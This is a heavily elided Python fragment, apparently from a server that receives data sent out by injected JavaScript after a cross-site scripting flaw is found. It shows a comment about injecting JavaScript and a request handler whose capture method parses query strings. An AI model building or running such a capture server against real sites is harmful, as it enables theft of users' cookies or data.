...
# Once you've found the exploit, and you're able to inject JavaScript,
...
import urllib.request, http.client, urllib.parse, datetime, re
...
class RequestHandler(BaseHTTPRequestHandler):
    ...
    def capture(self):
        ...
        dict = urllib.parse.parse_qs(self.path)
